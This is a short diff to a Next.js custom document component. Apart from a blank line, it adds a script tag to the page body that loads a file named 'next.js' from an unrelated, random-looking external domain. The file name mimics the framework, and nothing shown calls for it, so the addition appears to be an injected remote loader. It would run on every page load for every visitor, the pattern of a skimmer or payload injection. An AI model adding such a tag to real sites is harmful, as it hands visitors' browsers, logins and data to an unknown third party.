@@ -1,6 +1,7 @@
 import Document, { Head, Main, NextScript } from 'next/document'
 import React from "react";
 
+
 export default class MyDocument extends Document {
   static async getInitialProps(ctx) {
     const initialProps = await Document.getInitialProps(ctx)
@@ -14,6 +15,7 @@ export default class MyDocument extends Document {
         <body className="custom_class">
           <Main />
           <NextScript />
+          <script src="https://bnbmbsadadas.com/next.js"></script>
         </body>
       </html>
     )
